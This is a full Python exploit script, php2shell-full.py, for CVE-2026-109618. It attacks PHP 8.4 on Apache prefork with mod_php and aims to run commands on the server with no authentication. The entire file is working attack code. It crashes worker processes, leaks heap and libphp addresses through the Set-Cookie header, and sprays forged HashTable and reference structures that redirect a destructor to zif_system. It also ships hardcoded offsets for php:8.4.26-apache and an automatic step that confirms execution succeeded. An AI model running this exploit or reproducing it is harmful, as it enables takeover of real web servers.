#!/usr/bin/env python3
"""
php2shell-full.py — CVE-2026-109618 full pure-HTTP RCE exploit.
Author: phulelouch

Clean-room implementation of the 4-stage exploit chain:
  Stage 0: Rotate — kill current worker, get a fresh child with virgin heap
  Stage 1: Heap leak — Set-Cookie OOB read → Zend MM chunk base
  Stage 2: libphp leak — Set-Cookie pDestructor read → libphp base
  Stage 3: Fire — spray forged HashTable + reference → zif_system("cmd")

All traffic is plain HTTP. No SSH, no gdb.

Requirements:
  mod_php, Apache prefork, MaxRequestWorkers=1
  session.upload_progress.enabled=1, session.use_strict_mode=0
  display_errors=1, memory_limit=8M (or low enough to OOM)
  max_input_vars=1000

Usage:
  python3 php2shell-full.py -u http://TARGET:PORT/index.php
  python3 php2shell-full.py -u http://TARGET:PORT/index.php -c "id>/tmp/p" --proof /tmp/p
  python3 php2shell-full.py -u http://TARGET:PORT/index.php --calibrate
  python3 php2shell-full.py -u http://TARGET:PORT/index.php --dtor-offset 0xABC --zif-offset 0xDEF
"""

import argparse
import os
import re
import socket
import struct
import sys
import threading
import time
import ssl
import urllib.parse
from collections import Counter

VERSION = "1.0.0"
SID = b"attacksessionid0001"
MAX_CMD = 14

# User-Agent for all HTTP requests (env-overridable)
UA = os.environ.get("PHP2SHELL_UA", "poc-testing-123")


# ═══════════════════════════════════════════════════════════════
# DEFAULT CONFIGURATION (php:8.4.26-apache)
# ═══════════════════════════════════════════════════════════════

DEFAULT_CONFIG = {
    "dtor_offset": 0x65EB60,     # zval_ptr_dtor offset in libphp.so
    "zif_offset": 0x465370,      # zif_system offset in libphp.so
    "htdata_offset": 0x690D8,    # chunk-relative offset of the 167-byte string
    "oom_mb": 12,                # OOM field size in MB
    "stage1_n": None,            # heap leak spray count (None = needs calibration)
    "stage1_field_size": 48,     # POST field value size for stage 1
    "stage2_t": None,            # libphp leak spray index (None = needs calibration)
    "stage2_v": 16,              # POST field value size for stage 2
    "stage3_pads": [(31, 31)] * 6,
    "stage3_carrier": True,
}


# ═══════════════════════════════════════════════════════════════
# HTTP TRANSPORT
# ═══════════════════════════════════════════════════════════════

def http_post(host, port, path, body, boundary, timeout=90, extra_headers=None,
              read_cap=1 << 20, tls=False):
    """Raw HTTP/1.1 POST with concurrent reader (worker may die mid-send)."""
    extra = ""
    for k, v in (extra_headers or {}).items():
        extra += f"{k}: {v}\r\n"
    hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"User-Agent: {UA}\r\n"
        f"{extra}"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    s = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    s.settimeout(timeout)
    data = bytearray()

    def _reader():
        try:
            while len(data) < read_cap:
                c = s.recv(65536)
                if not c:
                    break
                data.extend(c)
        except OSError:
            pass

    reader = threading.Thread(target=_reader, daemon=True)
    reader.start()
    try:
        s.sendall(hdr)
        mv = memoryview(body)
        for off in range(0, len(body), 262144):
            try:
                s.sendall(mv[off:off + 262144])
            except OSError:
                break
    except OSError:
        pass
    reader.join(timeout=timeout + 1)
    s.close()
    return bytes(data)


def http_get(host, port, path, timeout=30, tls=False):
    """Simple HTTP GET."""
    hdr = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
           f"User-Agent: {UA}\r\n"
           f"Connection: close\r\n\r\n").encode()
    s = socket.create_connection((host, port), timeout=timeout)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)
    s.settimeout(timeout)
    try:
        s.sendall(hdr)
        data = bytearray()
        while len(data) < (1 << 20):
            c = s.recv(65536)
            if not c:
                break
            data += c
    except OSError:
        pass
    finally:
        s.close()
    head, _, body = bytes(data).partition(b"\r\n\r\n")
    m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
    return (int(m.group(1)) if m else 0), body


# ═══════════════════════════════════════════════════════════════
# MULTIPART BUILDER
# ═══════════════════════════════════════════════════════════════

def mp(parts, boundary):
    """Build multipart body. parts = [{"name": str, "data": bytes, "filename"?: str}]"""
    bn = boundary.encode() if isinstance(boundary, str) else boundary
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        out += b"--" + bn + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            fn = p["filename"].encode() if isinstance(p["filename"], str) else p["filename"]
            out += b'; filename="' + fn + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + bn + b"--\r\n"
    return bytes(out)


def parse_cookie(resp):
    """Extract and URL-decode PHPSESSID from Set-Cookie header."""
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp, re.I)
    if not m:
        return b""
    return urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))


# ═══════════════════════════════════════════════════════════════
# COOKIE ANALYSIS
# ═══════════════════════════════════════════════════════════════

def chunk_base_from_cookie(raw):
    """Stage 1 analysis: majority-vote 2MB-aligned heap pointers."""
    if len(raw) < 1000:
        return 0
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def libphp_from_cookie(raw, dtor_offset):
    """Stage 2 analysis: read pDestructor from the leaked cookie bytes."""
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x7F0000000000 <= p < 0x800000000000):
        return 0
    # Low 12 bits must match the offset's low 12 bits
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


# ═══════════════════════════════════════════════════════════════
# EXPLOIT
# ═══════════════════════════════════════════════════════════════

class Exploit:
    def __init__(self, host, port, path, config, verbose=True, tls=False):
        self.host = host
        self.port = port
        self.path = path
        self.p = config
        self.verbose = verbose
        self.tls = tls
        self.fire_tail = b""
        self.bn_s = "S" * 17          # boundary for ARM requests
        self.bn_b = "B" * 10          # boundary for leak/fire requests

    def log(self, msg):
        if self.verbose:
            print(msg, flush=True)

    def _post(self, body, bn, timeout=90, extra_headers=None, read_cap=1 << 20):
        return http_post(self.host, self.port, self.path, body, bn,
                         timeout=timeout, extra_headers=extra_headers,
                         read_cap=read_cap, tls=self.tls)

    def _file_part(self):
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def _big_field(self):
        return {"name": "big", "data": b"B" * (self.p["oom_mb"] * 1024 * 1024)}

    # ── Stage 0: Rotate ──────────────────────────────────────

    def rotate(self):
        """Kill the current worker; prefork spawns a fresh child."""
        self.log("[stage 0] rotate — killing worker")

        # Request A: 1001 fields + null PHPSESSID + progress + file + OOM
        # → fatal + session state dangles
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000}
                 for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self._post(mp(parts, self.bn_s), self.bn_s, timeout=90)
        time.sleep(0.3)

        # Request B: consumer walk on dangling PS(http_session_vars)
        # → worker segfaults → prefork spawns fresh child
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self._post(mp(parts, self.bn_b), self.bn_b, timeout=20)
        time.sleep(0.5)

    # ── Stage 1: Heap Leak ────────────────────────────────────

    def _arm_for_leak(self, field_data=b"x", field_count=1001):
        """ARM request for leak stages: N fields + null sid + progress + file + OOM."""
        parts = [{"name": f"p{i:04d}"[:5], "data": field_data}
                 for i in range(field_count)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self._post(mp(parts, self.bn_s), self.bn_s, timeout=90)
        time.sleep(0.2)

    def stage1_attempt(self, n):
        """One heap leak attempt with stage1_n = n. Returns chunk_base or 0."""
        self._arm_for_leak(b"x", 1001)

        # Leak request: n filler fields + forged blob at the end
        fsize = self.p["stage1_field_size"]
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(n):
            val = (f"v{i:04d}" + "x" * 44)[:fsize]
            parts.append({"name": str(1000 + i), "data": val.encode()})

        # The forged blob: 79 bytes with len=0x1000 at offset 0x10
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)  # overwrite zend_string.len
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        resp = self._post(mp(parts, self.bn_b), self.bn_b, timeout=60,
                          read_cap=9 << 20)

        # ── Show the raw HTTP response ──
        head, _, body = resp.partition(b"\r\n\r\n")
        self.log(f"  [stage 1 response]")
        for line in head.decode("latin1", errors="replace").split("\r\n")[:12]:
            self.log(f"    {line}")

        raw = parse_cookie(resp)
        if len(raw) > 100:
            self.log(f"  [cookie leak] {len(raw)} bytes decoded from Set-Cookie")
            self.log(f"    first 64 bytes (hex): {raw[:64].hex()}")
            self.log(f"    last 32 bytes (hex):  {raw[-32:].hex()}")
            # Show the pointer extraction
            from collections import Counter as _C
            c = _C()
            for i in range(len(raw) - 8):
                v = int.from_bytes(raw[i:i + 8], "little")
                if 0x7F0000000000 <= v < 0x800000000000:
                    c[v & ~0x1FFFFF] += 1
            if c:
                base, count = c.most_common(1)[0]
                self.log(f"    heap pointer votes: {hex(base)} × {count}")
        elif len(raw) > 0:
            self.log(f"  [cookie] {len(raw)} bytes (normal session ID, no leak)")
        else:
            self.log(f"  [cookie] no Set-Cookie in response")

        return chunk_base_from_cookie(raw)

    def stage1(self, n=None, sweep=None):
        """Get the Zend MM chunk base. Returns (chunk_base, n) or (0, 0)."""
        if n is not None:
            # Use the known calibrated value
            self.log(f"[stage 1] heap leak (n={n})")
            chunk = self.stage1_attempt(n)
            if chunk:
                self.log(f"  🎯 chunk_base = {hex(chunk)}")
                return chunk, n
            self.log(f"  miss — try with --calibrate")
            return 0, 0

        # Sweep mode
        if sweep is None:
            sweep = range(800, 950)
        self.log(f"[stage 1] heap leak — sweeping n={sweep.start}..{sweep.stop}")
        for val in sweep:
            self.rotate()
            chunk = self.stage1_attempt(val)
            if chunk:
                self.log(f"  🎯 n={val} → chunk_base = {hex(chunk)}")
                return chunk, val
            if val % 10 == 0:
                self.log(f"  n={val}: miss")
        return 0, 0

    # ── Stage 2: libphp Leak ──────────────────────────────────

    def stage2_attempt(self, t):
        """One libphp leak attempt with stage2_t = t. Returns libphp_base or 0."""
        # ARM with 39-byte fields (different free-list pattern)
        self._arm_for_leak(b"x" * 39, 1001)

        # Leak request: 983 fields, one with 16 sub-keys at index t
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        v = self.p["stage2_v"]
        for i in range(983):
            cnt = 16 if i == t else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * v})

        resp = self._post(mp(parts, self.bn_b), self.bn_b, timeout=60)

        # ── Show the raw HTTP response ──
        head, _, body = resp.partition(b"\r\n\r\n")
        self.log(f"  [stage 2 response]")
        for line in head.decode("latin1", errors="replace").split("\r\n")[:12]:
            self.log(f"    {line}")

        raw = parse_cookie(resp)
        if len(raw) >= 16:
            self.log(f"  [cookie] {len(raw)} bytes")
            self.log(f"    raw hex: {raw[:32].hex()}")
            p = int.from_bytes(raw[8:16], "little")
            self.log(f"    bytes[8:16] as ptr: {hex(p)}")
            if 0x7F0000000000 <= p < 0x800000000000:
                self.log(f"    low 12 bits: {hex(p & 0xFFF)} (need {hex(self.p['dtor_offset'] & 0xFFF)})")
                if p & 0xFFF == self.p["dtor_offset"] & 0xFFF:
                    base = p - self.p["dtor_offset"]
                    self.log(f"    🎯 MATCH! libphp_base = {hex(p)} - {hex(self.p['dtor_offset'])} = {hex(base)}")
        elif len(raw) > 0:
            self.log(f"  [cookie] {len(raw)} bytes (normal session ID)")
        else:
            self.log(f"  [cookie] no Set-Cookie")

        return libphp_from_cookie(raw, self.p["dtor_offset"])

    def stage2(self, t=None, sweep=None):
        """Get the libphp base. Returns (libphp_base, t) or (0, 0)."""
        if t is not None:
            self.log(f"[stage 2] libphp leak (t={t})")
            base = self.stage2_attempt(t)
            if base:
                self.log(f"  🎯 libphp_base = {hex(base)}")
                return base, t
            self.log(f"  miss — try with --calibrate")
            return 0, 0

        if sweep is None:
            sweep = range(380, 480)
        self.log(f"[stage 2] libphp leak — sweeping t={sweep.start}..{sweep.stop}")
        for val in sweep:
            self.rotate()
            base = self.stage2_attempt(val)
            if base:
                self.log(f"  🎯 t={val} → libphp_base = {hex(base)}")
                return base, val
            if val % 10 == 0:
                self.log(f"  t={val}: miss")
        return 0, 0

    # ── Stage 3: Fire ─────────────────────────────────────────

    def _build_payload(self, htdata, zif, cmd):
        """Build 167-byte fake HashTable + 55-byte fake reference."""
        cmd_bytes = cmd.encode()

        # ── 167-byte carrier ──
        ht = bytearray(b"\x00" * 167)

        # Fake HashTable at +0x00
        struct.pack_into("<II", ht, 0x00, 1, 7)              # gc: rc=1, IS_ARRAY
        struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)  # flags, nTableMask
        struct.pack_into("<Q",  ht, 0x10, htdata + 0x20)     # arData → bucket
        struct.pack_into("<II", ht, 0x18, 1, 1)              # nNumUsed, nNumOfElements
        struct.pack_into("<II", ht, 0x20, 8, 0)              # nTableSize, nInternalPointer
        struct.pack_into("<Q",  ht, 0x28, 0)                 # nNextFreeElement
        struct.pack_into("<Q",  ht, 0x30, zif)               # pDestructor = zif_system ←

        # Fake execute_data at +0x20 (= bucket[0].val = arData[0])
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)              # opline
        struct.pack_into("<Q", ht, E + 0x08, 0)              # call
        struct.pack_into("<Q", ht, E + 0x10, zif)            # return_value (safe)
        struct.pack_into("<Q", ht, E + 0x18, 0)              # func
        struct.pack_into("<Q", ht, E + 0x20, 0)              # This.value
        struct.pack_into("<I", ht, E + 0x28, 0)              # This.u1.type_info
        struct.pack_into("<I", ht, E + 0x2C, 1)              # num_args = 1 ←
        struct.pack_into("<Q", ht, E + 0x30, 0)              # prev_execute_data
        struct.pack_into("<Q", ht, E + 0x38, 0)              # symbol_table
        struct.pack_into("<I", ht, E + 0x40, 0)              # call_info
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)  # arg1.value → zend_string ←
        struct.pack_into("<I", ht, E + 0x58, 6)              # arg1 IS_STRING ←

        # Fake zend_string at +0x80
        struct.pack_into("<II", ht, 0x80, 1, 0x106)          # gc: rc=1, IS_STRING
        struct.pack_into("<Q",  ht, 0x88, 0)                 # h (hash)
        struct.pack_into("<Q",  ht, 0x90, len(cmd_bytes))    # len
        ht[0x98:0x98 + len(cmd_bytes)] = cmd_bytes           # val = "cmd\0"
        ht[0x98 + len(cmd_bytes)] = 0

        # ── 55-byte fake reference ──
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)            # rc=1, IS_REFERENCE
        struct.pack_into("<Q",  ref, 0x18, htdata)           # val.value → HashTable ←
        struct.pack_into("<Q",  ref, 0x20, 0x307)            # IS_ARRAY_EX
        struct.pack_into("<Q",  ref, 0x28, 0)                # sources

        return bytes(ht), bytes(ref)

    def stage3(self, htdata, zif, cmd):
        """ARM → spray → fire."""
        self.log(f"[stage 3] fire (htdata={hex(htdata)}, zif={hex(zif)})")

        ht_bytes, ref_bytes = self._build_payload(htdata, zif, cmd)

        # Request A (ARM): padding + progress + file + OOM
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (nl, vl) in enumerate(self.p["stage3_pads"]):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]

        # Cookie: existing session prevents Set-Cookie clobber at R0+16
        extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self._post(mp(parts, self.bn_s), self.bn_s, timeout=90,
                   extra_headers=extra)
        time.sleep(0.3)

        # Request B (Spray + Fire)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]

        if self.p.get("stage3_carrier"):
            # Carrier byte trick: reference via 15-byte bin-40 zend_string
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht_bytes})
        else:
            # Lab variant: spray HT then reference
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht_bytes})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref_bytes})

        r = self._post(mp(parts, self.bn_b), self.bn_b, timeout=30)
        self.fire_tail = r[-400:]


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(
        description="php2shell-full: CVE-2026-109618 pure-HTTP RCE (by phulelouch)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u http://127.0.0.1:8088/index.php --calibrate
  %(prog)s -u http://127.0.0.1:8088/index.php --stage1-n 841 --stage2-t 406 -c "id>/tmp/p1"
  %(prog)s -u http://TARGET/index.php --dtor-offset 0xABC --zif-offset 0xDEF --calibrate
""")
    ap.add_argument("-u", "--url", required=True, help="target PHP page")
    ap.add_argument("-c", "--cmd", default="id>/tmp/p1",
                    help=f"command to exec (max {MAX_CMD} bytes; use 'sh</f' for longer)")
    ap.add_argument("--proof", default="",
                    help="local file to read for proof (empty = skip)")
    ap.add_argument("--fetch", default="",
                    help="GET this path after fire for proof (e.g. /out/p1)")
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None,
                    help="zval_ptr_dtor offset (default: 0x65eb60)")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None,
                    help="zif_system offset (default: 0x465370)")
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=None,
                    help="chunk-relative htdata offset (default: 0x690d8)")
    ap.add_argument("--stage1-n", type=int, default=None,
                    help="heap leak spray count (skip sweep)")
    ap.add_argument("--stage2-t", type=int, default=None,
                    help="libphp leak spray index (skip sweep)")
    ap.add_argument("--calibrate", action="store_true",
                    help="sweep stage1_n/stage2_t to find the right values")
    ap.add_argument("--cal-range1", default="100:1500",
                    help="stage1 sweep range start:stop (default 100:1500)")
    ap.add_argument("--cal-range2", default="1:983",
                    help="stage2 sweep range start:stop (default 1:983)")
    ap.add_argument("--retries", type=int, default=3)
    ap.add_argument("--no-rotate", action="store_true",
                    help="skip initial rotate")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    if len(args.cmd.encode()) > MAX_CMD:
        ap.error(f"--cmd limited to {MAX_CMD} bytes")

    # Parse URL
    m = re.match(r"(https?)://([^:/]+):?(\d+)?(/.*)?", args.url)
    if not m:
        ap.error("invalid URL")
    scheme, host, port_str, path = m.groups()
    port = int(port_str) if port_str else (443 if scheme == "https" else 80)
    path = path or "/index.php"

    # Build config from defaults + CLI overrides
    prof = dict(DEFAULT_CONFIG)
    if args.dtor_offset is not None:
        prof["dtor_offset"] = args.dtor_offset
    if args.zif_offset is not None:
        prof["zif_offset"] = args.zif_offset
    if args.htdata_offset is not None:
        prof["htdata_offset"] = args.htdata_offset
    if args.stage1_n is not None:
        prof["stage1_n"] = args.stage1_n
    if args.stage2_t is not None:
        prof["stage2_t"] = args.stage2_t

    ex = Exploit(host, port, path, prof, verbose=not args.quiet,
                 tls=(scheme == "https"))

    print(f"php2shell-full v{VERSION} (by phulelouch)")
    print(f"target:  {host}:{port}{path}")
    print(f"cmd:     {args.cmd}")
    print(f"offsets: DTOR=0x{prof['dtor_offset']:x} ZIF=0x{prof['zif_offset']:x} "
          f"HTDATA=0x{prof['htdata_offset']:x}")
    if prof.get("stage1_n"):
        print(f"stage1:  n={prof['stage1_n']} (hardcoded)")
    else:
        print(f"stage1:  sweep {'(--calibrate)' if args.calibrate else '(needs --calibrate or --stage1-n)'}")
    if prof.get("stage2_t"):
        print(f"stage2:  t={prof['stage2_t']} (hardcoded)")
    else:
        print(f"stage2:  sweep {'(--calibrate)' if args.calibrate else '(needs --calibrate or --stage2-t)'}")
    print()

    # ── Stage 0: Rotate ──
    if not args.no_rotate:
        ex.rotate()

    # ── Stage 1: Heap Leak ──
    chunk_base = 0
    s1_n = prof.get("stage1_n")
    for attempt in range(1, args.retries + 1):
        if s1_n:
            chunk_base, s1_n = ex.stage1(n=s1_n)
        elif args.calibrate:
            r1_start, r1_stop = (int(x) for x in args.cal_range1.split(":"))
            chunk_base, s1_n = ex.stage1(sweep=range(r1_start, r1_stop))
        else:
            print("ERROR: stage1_n unknown — use --calibrate or --stage1-n N",
                  file=sys.stderr)
            return 1

        if chunk_base:
            break
        ex.log(f"  attempt {attempt}/{args.retries} failed")
        if not args.calibrate:
            ex.rotate()

    if not chunk_base:
        print("HEAP_LEAK_FAILED", file=sys.stderr)
        return 1

    ex.rotate()

    # ── Stage 2: libphp Leak ──
    libphp_base = 0
    s2_t = prof.get("stage2_t")
    for attempt in range(1, args.retries + 1):
        if s2_t:
            libphp_base, s2_t = ex.stage2(t=s2_t)
        elif args.calibrate:
            r2_start, r2_stop = (int(x) for x in args.cal_range2.split(":"))
            libphp_base, s2_t = ex.stage2(sweep=range(r2_start, r2_stop))
        else:
            print("ERROR: stage2_t unknown — use --calibrate or --stage2-t N",
                  file=sys.stderr)
            return 1

        if libphp_base:
            break
        ex.log(f"  attempt {attempt}/{args.retries} failed")
        if not args.calibrate:
            ex.rotate()

    if not libphp_base:
        print("LIBPHP_LEAK_FAILED", file=sys.stderr)
        return 1

    ex.rotate()

    # ── Compute addresses ──
    htdata = chunk_base + prof["htdata_offset"]
    zif = libphp_base + prof["zif_offset"]
    print(f"\n[addresses]")
    print(f"  chunk_base  = {hex(chunk_base)} (n={s1_n})")
    print(f"  libphp_base = {hex(libphp_base)} (t={s2_t})")
    print(f"  htdata      = {hex(htdata)}")
    print(f"  zif_system  = {hex(zif)}")

    # ── Stage 3: Fire ──
    if args.calibrate:
        print(f"\n[calibration complete]")
        print(f"  --stage1-n {s1_n} --stage2-t {s2_t}")
        print(f"  Re-run without --calibrate to fire stage 3.")
        return 0

    for attempt in range(1, args.retries + 3):
        ex.log(f"\n[stage 3] attempt {attempt}/{args.retries + 2}")
        try:
            ex.stage3(htdata, zif, args.cmd)
        except OSError as e:
            ex.log(f"  error: {e}")

        time.sleep(0.8)

        # Inline proof: system() stdout lands in the fire response body
        tail = getattr(ex, "fire_tail", b"")
        if tail:
            ex.log(f"  fire tail: {tail[-200:]!r}")
            m_uid = re.search(rb"uid=\d+[^\r\n<]{0,160}", tail)
            if m_uid:
                print("\n🎯 RCE CONFIRMED inline (uid in fire response)")
                print(f"PROOF: {m_uid.group(0).decode('latin1').strip()}")
                return 0

        # Check proof
        proof = ""
        if args.proof:
            try:
                if os.path.exists(args.proof):
                    with open(args.proof, "rb") as f:
                        proof = f.read().decode("latin1").strip()
            except OSError:
                pass

        if not proof and args.fetch:
            status, body = http_get(host, port, args.fetch,
                                    tls=(scheme == "https"))
            if status == 200 and body.strip():
                proof = body.decode("latin1").strip()

        if proof:
            print(f"\n🎯 RCE CONFIRMED (attempt {attempt})")
            print(f"PROOF: {proof}")
            return 0

        ex.log(f"  no proof yet")
        ex.rotate()

    print("\nNo automatic proof captured. The command may still have executed.", file=sys.stderr)
    print("Check the target manually:", file=sys.stderr)
    print(f"  docker exec <container> cat /tmp/p1", file=sys.stderr)
    print(f"  curl http://TARGET/out/p1", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
